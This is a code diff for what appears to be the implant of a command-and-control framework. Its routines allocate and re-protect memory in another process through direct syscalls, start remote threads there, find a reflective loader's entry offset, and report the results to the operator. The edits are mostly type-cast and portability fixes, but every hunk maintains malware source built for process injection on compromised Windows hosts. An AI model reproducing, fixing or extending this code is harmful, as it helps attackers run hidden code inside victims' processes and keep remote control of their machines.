@@ -43,7 +43,7 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
             PRINTF( "NtAllocateVirtualMemory( %x, %p, %d, %p [%d], %d, %x ) => ", hProcess, &Memory, 0, &MemSize, MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
             NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
 #ifdef DEBUG
-            printf( "%x\n", NtStatus );
+            printf( "%lx\n", NtStatus );
 #endif
             if ( ! NT_SUCCESS( NtStatus ) )
             {
@@ -66,7 +66,7 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
     if ( Memory && Instance.Config.Implant.Verbose )
     {
         PUTS( "Memory" )
-        PackageAddInt32( Package, Memory );
+        PackageAddPtr( Package, Memory );
         PackageAddInt32( Package, MemSize );
         PackageAddInt32( Package, Protect );
         PackageTransmit( Package, NULL, NULL );
@@ -112,7 +112,7 @@ BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T
     if ( Success && Instance.Config.Implant.Verbose )
     {
         PUTS( "Memory Protection" )
-        PackageAddInt32( Package, Memory );
+        PackageAddPtr( Package, Memory );
         PackageAddInt32( Package, MemSize );
         PackageAddInt32( Package, OldProtect );
         PackageAddInt32( Package, Protect );
@@ -144,7 +144,9 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
         case DX_THREAD_WIN32:
         {
             PUTS( "DX_THREAD_WIN32" );
-            Success = Instance.Win32.CreateRemoteThread( hProcess, NULL, 0, EntryPoint, ctx->Parameter, NULL, &ctx->ThreadID );
+            ctx->hThread = Instance.Win32.CreateRemoteThread( hProcess, NULL, 0, EntryPoint, ctx->Parameter, 0, &ctx->ThreadID );
+            if ( ctx->hThread )
+                Success = TRUE;
             break;
         }
 
@@ -160,10 +162,10 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
 
             ThreadAttr.Entry.Attribute  = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
             ThreadAttr.Entry.Size       = sizeof( CLIENT_ID );
-            ThreadAttr.Entry.pValue     = &ClientId;
+            ThreadAttr.Entry.pValue     = ( PULONG_PTR )&ClientId;
             ThreadAttr.Length           = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
 
-            NtStatus = Instance.Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, NULL, NULL, NULL, &ThreadAttr );
+            NtStatus = Instance.Syscall.NtCreateThreadEx( &ctx->hThread, THREAD_ALL_ACCESS, NULL, hProcess, EntryPoint, ctx->Parameter, FALSE, 0, 0, 0, &ThreadAttr );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtCreateThreadEx: failed" )
@@ -173,7 +175,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
 
             PRINTF( "Thread id : %d\n", ClientId.UniqueThread );
 
-            ctx->ThreadID = ClientId.UniqueThread;
+            ctx->ThreadID = ( DWORD ) ( ULONG_PTR ) ClientId.UniqueThread;
             Success       = TRUE;
 
             break;
@@ -212,8 +214,8 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
                             InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );
 
                             // set the correct pid and tid
-                            ProcClientID.UniqueProcess = ( HANDLE ) ctx->ProcessID;
-                            ProcClientID.UniqueThread  = ( HANDLE ) threadId;
+                            ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
+                            ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;
 
                             Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
 
@@ -271,7 +273,7 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
         if ( Instance.Config.Implant.Verbose )
         {
             PUTS( "Success" )
-            PackageAddInt32( Package, EntryPoint );
+            PackageAddPtr( Package, EntryPoint );
             PackageAddInt32( Package, ctx->ThreadID );
             PackageTransmit( Package, NULL, NULL );
         }
@@ -317,10 +319,10 @@ DWORD GetReflectiveLoaderOffset( PVOID ReflectiveLdrAddr )
 {
     PIMAGE_NT_HEADERS       NtHeaders           = NULL;
     PIMAGE_EXPORT_DIRECTORY ExportDir           = NULL;
-    UINT_PTR                AddrOfNames         = NULL;
-    UINT_PTR                AddrOfFunctions     = NULL;
-    UINT_PTR                AddrOfNameOrdinals  = NULL;
-    DWORD                   FunctionCounter     = NULL;
+    UINT_PTR                AddrOfNames         = 0;
+    UINT_PTR                AddrOfFunctions     = 0;
+    UINT_PTR                AddrOfNameOrdinals  = 0;
+    DWORD                   FunctionCounter     = 0;
     PCHAR                   FunctionName        = NULL;
 
     NtHeaders           = RVA( PIMAGE_NT_HEADERS, ReflectiveLdrAddr, ( ( PIMAGE_DOS_HEADER ) ReflectiveLdrAddr )->e_lfanew );
